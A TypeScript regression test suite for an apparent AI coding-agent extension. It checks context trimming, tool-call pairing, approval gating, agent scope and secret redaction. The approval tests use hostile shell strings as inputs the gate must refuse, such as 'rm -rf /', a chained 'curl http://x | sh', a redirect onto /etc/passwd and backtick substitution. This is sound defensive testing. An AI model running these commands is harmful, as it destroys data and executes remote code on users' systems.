/**
 * The defects an adversarial review found, each pinned by the property it
 * broke rather than by the shape of the fix.
 *
 * Every case here was reachable in a shipped build and invisible to the whole
 * of the rest of this suite. Where an existing test claimed to cover one, it
 * asserted against a function called in isolation or against a double that
 * reimplemented the logic under test - so the wiring could be deleted and the
 * assertions would still pass. These drive the real path.
 *
 * Run: npx esbuild test/regressions.ts --bundle --outfile=dist/regressions.cjs \
 *        --format=cjs --platform=node --target=node20 --alias:vscode=./test/vscode-stub.ts
 *      node dist/regressions.cjs
 */
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { App } from "../src/core/app";
import { reset, makeContext } from "./vscode-stub";
import { fitToWindow, messageTokens, WINDOW_NOTE, runAgent } from "../src/agent/loop";
import { EndpointClient } from "../src/providers/client";
import type { CompletionEvent, CompletionRequest, Msg, ToolDef } from "../src/providers/client";
import { loadAgents } from "../src/agents/loader";
import { loadProfile } from "../src/endpoints/profile";
import { redactSecrets } from "../src/endpoints/auth";
import type { ToolContext } from "../src/agent/tools";

let pass = 0;
let fail = 0;
function ck(ok: boolean, label: string, detail = "") {
  ok ? pass++ : fail++;
  console.log(`${ok ? "PASS" : "FAIL"}  ${label}${detail ? "  — " + detail : ""}`);
}

const TMP = path.join(os.tmpdir(), "kx-regress-" + Date.now());
const EXT = path.resolve(".");

const GOOD = `name: gw
wire: openai
baseUrl: https://example.invalid/v1
model: test-model
auth:
  kind: none
`;

async function boot(files: Record<string, string> = { "gw.yaml": GOOD }) {
  const root = path.join(TMP, "ws-" + Math.random().toString(36).slice(2));
  fs.mkdirSync(path.join(root, ".agent", "endpoints"), { recursive: true });
  for (const [name, body] of Object.entries(files)) {
    fs.writeFileSync(path.join(root, ".agent", "endpoints", name), body, "utf8");
  }
  reset(root);
  const storage = path.join(TMP, "s-" + Math.random().toString(36).slice(2));
  fs.mkdirSync(storage, { recursive: true });
  const app = new App(makeContext(storage, EXT) as any);
  await app.init();
  app.registerSink("sidebar", () => {});
  return { app, root };
}

/**
 * Give the conversation a name so the model is not asked for one.
 *
 * `nameFromFirstMessage` fires a separate one-shot on the SAME pooled client,
 * so a stub that answers by position hands its first reply to the title
 * request rather than to the turn. Nothing here is testing naming.
 */
function quiet(app: any) {
  app.session.title = "Fixed title";
}

/** Swap in a client that records the request and answers with fixed events. */
function capture(app: any, events: CompletionEvent[] = [{ type: "text", text: "ok" }]) {
  const profile = app.activeProfile();
  const seen: CompletionRequest[] = [];
  app.clients.set(profile.name, {
    profile,
    async *complete(req: CompletionRequest) {
      seen.push(req);
      for (const e of events) yield e;
    },
    close: async () => {},
  });
  return seen;
}

const wire = (m: Msg[]) => JSON.stringify(m);

async function main() {
  fs.mkdirSync(TMP, { recursive: true });

  /* ── 1. the user's turn reaches the model on the turn it was sent ─────── */
  console.log("──── what the model is actually asked ────");
  {
    const { app, root } = await boot();
    fs.writeFileSync(path.join(root, "notes.md"), "MENTIONED_FILE_BODY\n", "utf8");
    quiet(app);
    const seen = capture(app);

    await app.session.send("summarise @notes.md", [
      {
        name: "attached.txt",
        mediaType: "text/plain",
        data: Buffer.from("ATTACHED_FILE_BODY").toString("base64"),
      },
    ]);

    const sent = wire(seen[0].messages);
    ck(seen.length === 1, "the turn made exactly one request", String(seen.length));
    // These went into the transcript and not into the request: the loop was
    // handed the raw composer text while the composed message - attachments,
    // resolved mentions, editor context - was pushed into history behind it.
    // Everything the user attached reached the model exactly one turn late.
    ck(/MENTIONED_FILE_BODY/.test(sent), "an @ mention's contents are in the request");
    ck(/ATTACHED_FILE_BODY/.test(sent), "and so is an attached file's");
    ck(/summarise @notes\.md/.test(sent), "along with what the user typed");

    // And the transcript holds exactly one copy of it, not two.
    const users = app.session.history.filter((m: Msg) => m.role === "user");
    ck(users.length === 1, "the turn is recorded once", String(users.length));
    ck(/ATTACHED_FILE_BODY/.test(JSON.stringify(users[0])),
      "and what is recorded is what was sent");
    await app.dispose();
  }

  /* ── 2. the context window is actually enforced ───────────────────────── */
  console.log("\n──── fitToWindow ────");
  {
    const big = "x".repeat(200_000);
    const fits = (ms: Msg[], l: number, r: number) =>
      ms.reduce((n, m) => n + messageTokens(m), 0) <= l - r;

    const one = fitToWindow(
      [{ role: "system", content: "s" }, { role: "user", content: big }], 8000, 1024);
    ck(!one.some((m) => m.content === WINDOW_NOTE),
      "no 'earlier turns were dropped' note when nothing was dropped");
    ck(one[one.length - 1].role === "user", "the user's turn stays last");
    ck(fits(one, 8000, 1024), "and the result is inside the budget it was given");

    // The orphan. An assistant turn holding tool calls used to be pinned in the
    // head by `slice(0, 2)` while its results were trimmed out from under it -
    // which the Anthropic wire rejects, permanently, one turn later.
    const withCalls: Msg[] = [
      { role: "system", content: "s" },
      { role: "assistant", content: "", toolCalls: [{ id: "c1", name: "read_file", arguments: {} }] as any },
      { role: "tool", toolCallId: "c1", content: big },
      { role: "user", content: big },
      { role: "user", content: "now what" },
    ];
    const trimmed = fitToWindow(withCalls, 8000, 1024);
    const calls = new Set(trimmed.flatMap((m: any) => (m.toolCalls ?? []).map((t: any) => t.id)));
    const results = new Set(trimmed.filter((m: any) => m.toolCallId).map((m: any) => m.toolCallId));
    ck([...calls].every((c) => results.has(c)), "no tool call is left without its result");
    ck([...results].every((r) => calls.has(r)), "and no result without its call");

    // A long conversation of paired calls, trimmed hard.
    const convo: Msg[] = [{ role: "system", content: "s" }, { role: "user", content: "start" }];
    for (let i = 0; i < 12; i++) {
      convo.push({ role: "assistant", content: "", toolCalls: [{ id: "t" + i, name: "read_file", arguments: {} }] as any });
      convo.push({ role: "tool", toolCallId: "t" + i, content: "y".repeat(9000) });
    }
    convo.push({ role: "user", content: "summarise" });
    const cut = fitToWindow(convo, 8000, 1024);
    const cCalls = new Set(cut.flatMap((m: any) => (m.toolCalls ?? []).map((t: any) => t.id)));
    const cRes = new Set(cut.filter((m: any) => m.toolCallId).map((m: any) => m.toolCallId));
    ck([...cCalls].every((c) => cRes.has(c)) && [...cRes].every((r) => cCalls.has(r)),
      "pairs survive trimming intact");
    ck(cut.some((m) => m.content === WINDOW_NOTE), "and the note appears when turns really did go");
    ck(fits(cut, 8000, 1024), "with the result inside the budget");

    // A capabilities typo used to make every comparison NaN, so nothing was
    // ever trimmed and the note was pinned to every request.
    const nan = fitToWindow([{ role: "system", content: "s" }, { role: "user", content: "hi" }], NaN, 1024);
    ck(!nan.some((m) => m.content === WINDOW_NOTE), "an unreadable budget trims nothing silently");

    const same: Msg[] = [{ role: "system", content: "s" }, { role: "user", content: "hi" }];
    ck(fitToWindow(same, 8000, 1024) === same, "a conversation that fits is returned untouched");
  }

  /* ── 3. an empty completion does not poison the conversation ──────────── */
  console.log("\n──── an endpoint that answers with nothing ────");
  {
    const { app } = await boot();
    quiet(app);
    capture(app, [{ type: "text", text: "   " }, { type: "done" }]);
    await app.session.send("hello");
    const empties = app.session.history.filter(
      (m: Msg) => m.role === "assistant" && typeof m.content === "string" && !m.content.trim());
    ck(empties.length === 0, "no empty assistant turn is written to the transcript",
      String(empties.length));
    await app.dispose();
  }
  {
    // And one already on disk is repaired on the way out rather than 400ing.
    const p: any = {
      name: "gw", wire: "anthropic", baseUrl: "https://x.invalid", model: "m",
      auth: { kind: "none" },
      capabilities: {
        streaming: true, tools: true, vision: false, systemRole: "message",
        contextWindow: 32000, maxOutputTokens: 1024, maxImageBytes: 1e9,
        parallelToolCalls: false, promptCaching: "none", cacheTtl: "5m",
        parallelToolExecution: true, fim: false,
      },
    };
    const c: any = new EndpointClient(p, () => undefined, process.cwd());
    const body = c.encode({
      messages: [
        { role: "system", content: "s" },
        { role: "user", content: "hi" },
        { role: "assistant", content: "" },
        { role: "user", content: "still there?" },
      ],
      stream: false,
    }).body;
    const empty = body.messages.filter(
      (m: any) => typeof m.content === "string" && !m.content.trim());
    ck(empty.length === 0, "a stored empty turn is not sent as an empty content block");

    // The trimmer's note lands beside a user turn; the wire alternates.
    const roles = c.encode({
      messages: [
        { role: "system", content: "s" },
        { role: "user", content: "first" },
        { role: "user", content: WINDOW_NOTE },
        { role: "assistant", content: "ok" },
      ],
      stream: false,
    }).body.messages.map((m: any) => m.role);
    ck(!roles.some((r: string, i: number) => r === roles[i - 1]),
      "consecutive same-role turns are merged", roles.join(" -> "));
  }

  /* ── 4. tool results stay contiguous on the OpenAI wire ───────────────── */
  console.log("\n──── batched tool calls with an image ────");
  {
    const p: any = {
      name: "gw", wire: "openai", baseUrl: "https://x.invalid/v1", model: "m",
      auth: { kind: "none" },
      capabilities: {
        streaming: true, tools: true, vision: true, systemRole: "message",
        contextWindow: 32000, maxOutputTokens: 1024, maxImageBytes: 1e9,
        parallelToolCalls: true, promptCaching: "none", cacheTtl: "5m",
        parallelToolExecution: true, fim: false,
      },
    };
    const c: any = new EndpointClient(p, () => undefined, process.cwd());
    const msgs = c.encode({
      messages: [
        { role: "system", content: "s" },
        { role: "user", content: "look and read" },
        { role: "assistant", content: "", toolCalls: [
          { id: "c1", name: "browser", arguments: {} },
          { id: "c2", name: "read_file", arguments: {} }] as any },
        { role: "tool", toolCallId: "c1", content: [
          { type: "text", text: "shot" },
          { type: "image", mediaType: "image/png", data: "AAAA" }] as any },
        { role: "tool", toolCallId: "c2", content: "file body" },
      ],
      stream: false,
    }).body.messages;

    // The wire requires every tool result for one assistant turn to arrive
    // together. A user message carrying the screenshot used to be spliced
    // between them, which is a 400 naming tool_call_id.
    const at = msgs.findIndex((m: any) => m.tool_calls);
    const after = msgs.slice(at + 1);
    const firstNonTool = after.findIndex((m: any) => m.role !== "tool");
    const answered = after.slice(0, firstNonTool === -1 ? after.length : firstNonTool)
      .map((m: any) => m.tool_call_id);
    ck(answered.join(",") === "c1,c2",
      "every tool result follows its call with nothing in between", answered.join(","));
    ck(JSON.stringify(msgs).includes("image_url"), "and the image still reaches the model");
  }

  /* ── 5. a stream that stops early says so ─────────────────────────────── */
  console.log("\n──── a truncated stream ────");
  {
    const { app } = await boot();
    const errs: string[] = [];
    app.registerSink("sidebar", (m: any) => { if (m.type === "error") errs.push(m.message); });
    // No [DONE], no finish_reason: the shape a proxy leaves behind when it cuts
    // a response. The reply used to be recorded as complete, silently.
    quiet(app);
    capture(app, [
      { type: "text", text: "half a sen" },
      { type: "stream_truncated" },
      { type: "done" },
    ]);
    await app.session.send("go");
    ck(errs.some((e) => /closed the stream before/i.test(e)),
      "the user is told the reply is a fragment", errs.join(" | "));
    await app.dispose();
  }

  /* ── 6. approval is decided by what is being asked, not by its wording ── */
  console.log("\n──── the approval gate ────");
  {
    const { app } = await boot();
    const asked: string[] = [];
    const session: any = app.session;
    // "Always allow" on an ordinary edit. It used to set one boolean that was
    // then consulted for every request that was not a shell command - browser
    // eval, fetch_url, web_search, image generation and every MCP call.
    session.alwaysAllow.add("edit");

    const ask = (summary: string, kind: any) => {
      const p = session.requestApproval(summary, undefined, undefined, undefined, kind);
      // A pending question registers an entry; an auto-approval does not.
      const pendingNow = session.pending.size > 0;
      if (pendingNow) {
        for (const [id] of session.pending) session.resolvePermission(id, "deny");
        asked.push(kind);
      }
      return p;
    };
    ask("Edit src/a.ts", "edit");
    ask("Run JavaScript in the page: fetch('http://x')", "browser");
    ask("Fetch http://x", "network");
    ask("Call MCP tool mcp__github__create_issue", "mcp");
    ask("Run: rm -rf /", "command");
    ck(!asked.includes("edit"), "an edit is auto-approved, which is what was allowed");
    ck(asked.includes("browser"), "browser scripting still asks");
    ck(asked.includes("network"), "so does a network fetch");
    ck(asked.includes("mcp"), "so does an MCP call");
    ck(asked.includes("command"), "and so does a shell command");
    await app.dispose();
  }
  {
    const { app } = await boot();
    const session: any = app.session;
    // The command allowlist matched the first whitespace-delimited token of a
    // string handed to a shell, so allowing `pytest` allowed everything that
    // could be chained after it.
    await app.rememberAllowedCommand("pytest");
    const allowed = async (cmd: string) => {
      const before = session.pending.size;
      const p = session.requestApproval(`Run: ${cmd}`, undefined, undefined, undefined, "command");
      if (session.pending.size > before) {
        for (const [id] of session.pending) session.resolvePermission(id, "deny");
        return false;
      }
      return p;
    };
    ck((await allowed("pytest -q")) === true, "the allowed command runs unprompted");
    ck((await allowed("pytest -q && curl http://x | sh")) === false,
      "a second command chained onto it does not");
    ck((await allowed("pytest; rm -rf ~")) === false, "nor one after a semicolon");
    ck((await allowed("pytest > /etc/passwd")) === false, "nor a redirect");
    ck((await allowed("pytest `id`")) === false, "nor a substitution");
    await app.dispose();
  }

  /* ── 7. the agent scope gate, through the real controller ─────────────── */
  console.log("\n──── agent scope at the execution boundary ────");
  {
    // The existing suite checks this against a test double that reimplements
    // the predicate, so the wiring in SessionController could be deleted with
    // every assertion still green. This drives the controller's own facade.
    const { app, root } = await boot();
    fs.mkdirSync(path.join(root, ".agent", "agents"), { recursive: true });
    fs.writeFileSync(path.join(root, ".agent", "agents", "reader.md"), [
      "---", "name: reader", "description: reads.",
      "tools: [read_file]",
      "mcp:", "  filesystem:", "    tools:", "      include: [read_text_file]",
      "---", "", "You read.", "",
    ].join("\n"), "utf8");
    await app.reload("test");
    await app.setActiveAgent("reader");

    const reached: string[] = [];
    (app as any).mcp = {
      has: (n: string) => n.startsWith("mcp__"),
      needsApproval: () => false,
      isReadOnly: () => false,
      toolDefs: () => [],
      statuses: () => [],
      warnings: [],
      call: async (n: string) => { reached.push(n); return { content: "ok" }; },
      reload: async () => {},
      stopAll: async () => {},
      toolCount: () => 0,
      unavailableCount: () => 0,
      configPresent: true,
    };

    const calls = [
      { id: "a", name: "mcp__filesystem__read_text_file", arguments: {} },
      { id: "b", name: "mcp__filesystem__write_file", arguments: {} },
      { id: "c", name: "mcp__github__create_issue", arguments: {} },
    ];
    quiet(app);
    const profile = app.activeProfile()!;
    (app as any).clients.set(profile.name, {
      profile,
      // Branch on what is being asked, not on a call counter: the counter was
      // consumed by whichever request happened to arrive first.
      async *complete(req: any) {
        const answered = req.messages.some((m: any) => m.role === "tool");
        if (answered) yield { type: "text", text: "done" } as any;
        else for (const c of calls) yield { type: "tool_call", toolCall: c } as any;
      },
      close: async () => {},
    });

    await app.session.send("go");
    ck(reached.includes("mcp__filesystem__read_text_file"),
      "a tool inside the agent's scope reaches the server");
    ck(!reached.includes("mcp__filesystem__write_file"),
      "one the agent filtered out never does");
    ck(!reached.includes("mcp__github__create_issue"),
      "nor a server the agent never named", reached.join(","));
    await app.dispose();
  }

  /* ── 8. a malformed scope declaration fails closed ────────────────────── */
  console.log("\n──── agent config that is wrong rather than absent ────");
  {
    const d = path.join(TMP, "agents-bad");
    fs.mkdirSync(d, { recursive: true });
    fs.writeFileSync(path.join(d, "a.md"),
      ["---", "name: a", "description: d.", "mcp: 42", "---", "", "body", ""].join("\n"), "utf8");
    const got = loadAgents(d);
    // This used to return allMcp: true - a typo in a restriction granted every
    // configured server, which is the opposite of what writing it meant.
    ck(got.agents[0]?.allMcp === false, "an unreadable mcp: value grants nothing");
    ck(got.warnings.some((w) => /mcp must be/.test(w)), "and says so");
  }

  /* ── 9. profiles: duplicates, typos, and a missing active one ─────────── */
  console.log("\n──── endpoint profiles ────");
  {
    const dir = path.join(TMP, "profiles");
    fs.mkdirSync(dir, { recursive: true });
    const f = path.join(dir, "bad.yaml");
    fs.writeFileSync(f, GOOD + "capabilities:\n  contextWindow: 128k\n", "utf8");
    let threw = "";
    try { loadProfile(f); } catch (e: any) { threw = e.message; }
    // A string here reached fitToWindow as NaN, which disabled the window
    // entirely while pinning the "turns were dropped" note to every request.
    ck(/contextWindow/.test(threw) && /positive number/.test(threw),
      "a non-numeric contextWindow is refused, by name", threw);

    fs.writeFileSync(f, GOOD + "capabilities:\n  vision: \"true\"\n", "utf8");
    threw = "";
    try { loadProfile(f); } catch (e: any) { threw = e.message; }
    ck(/vision/.test(threw), "so is a quoted boolean", threw);

    fs.writeFileSync(f, GOOD + "capabilities:\n  contextWindw: 4096\n", "utf8");
    threw = "";
    try { loadProfile(f); } catch (e: any) { threw = e.message; }
    ck(/not a setting/.test(threw), "and a misspelled key is not silently ignored", threw);
  }
  {
    // Two files claiming the same name routed every request through whichever
    // loaded first, because clients are pooled by name.
    const { app } = await boot({
      "a.yaml": GOOD,
      "b.yaml": GOOD.replace("baseUrl: https://example.invalid/v1", "baseUrl: https://other.invalid/v1"),
    });
    ck(app.profiles.length === 1, "a duplicate profile name loads once, not twice",
      String(app.profiles.length));
    ck(app.profileErrors.some((e) => /already called/.test(e.message)),
      "and the collision is reported", app.profileErrors.map((e) => e.message).join(" "));
    await app.dispose();
  }

  /* ── 10. the pre-warmed prompt head is the head that is sent ──────────── */
  console.log("\n──── prompt cache pre-warm ────");
  {
    const { app } = await boot();
    quiet(app);
    const seen = capture(app);
    await app.session.send("hello");
    const turnReq = seen.find((r) =>
      r.messages.some((m) => typeof m.content === "string" && m.content.includes("hello")));
    const sentSystem = (turnReq?.messages.find((m) => m.role === "system")?.content ?? "") as string;
    // systemPrompt() omitted the identity paragraph the loop adds, and that
    // paragraph sits second in the join - so the warmed prefix diverged before
    // the skills index and every warm-up bought nothing.
    ck(app.systemPrompt() === sentSystem,
      "the warmed head is byte-identical to the one the turn sends",
      `warm ${app.systemPrompt().length} vs sent ${sentSystem.length}`);
    await app.dispose();
  }

  /* ── 11. a background turn's failure is not lost ──────────────────────── */
  console.log("\n──── errors are replayable ────");
  {
    const { app } = await boot();
    capture(app, [{ type: "text", text: "partial" }]);
    const session: any = app.session;
    const turn = {
      id: session.sessionId, abort: new AbortController(), history: session.history,
      replay: [] as any[], title: session.title, steer: [], steerFiles: [], steerFilesInFlight: [],
    };
    session.emit(turn, { type: "error", message: "boom", action: "diagnostics" });
    ck(turn.replay.some((e: any) => e.type === "error"),
      "an error is buffered against its turn, so a reload and a switch both keep it");
    await app.dispose();
  }

  /* ── 12. deleting a conversation ends it ──────────────────────────────── */
  console.log("\n──── a deleted conversation stays deleted ────");
  {
    const { app } = await boot();
    const session: any = app.session;
    quiet(app);
    capture(app);
    await app.session.send("hello");
    const id = session.sessionId;
    ck(!!app.sessions.load(id), "the conversation was saved");
    app.session.deleteSession(id);
    ck(!app.sessions.load(id), "and deleting it removes it");
    // The turn that was running used to keep going and write the file back.
    session.persistTurn({ id, history: [{ role: "user", content: "x" }], title: "t" });
    ck(!app.sessions.load(id), "a turn still unwinding cannot resurrect it");
    await app.dispose();
  }

  /* ── 13. nothing token-shaped survives into an error message ──────────── */
  console.log("\n──── credentials in diagnostics ────");
  {
    ck(!/sk-live/.test(redactSecrets('{"error":"bad","client_secret":"sk-live-abcdefghijklmnop"}')),
      "a client_secret is masked");
    ck(!/eyJhbG/.test(redactSecrets("Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJhIjoxfQ.zzz")),
      "so is a bearer JWT");
    ck(/error/.test(redactSecrets('{"error":"invalid_client","client_secret":"x-very-long-secret"}')),
      "while the part that explains the failure survives");
  }

  console.log(`\n──── ${pass} passed, ${fail} failed ────`);
  if (fail) process.exit(1);
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
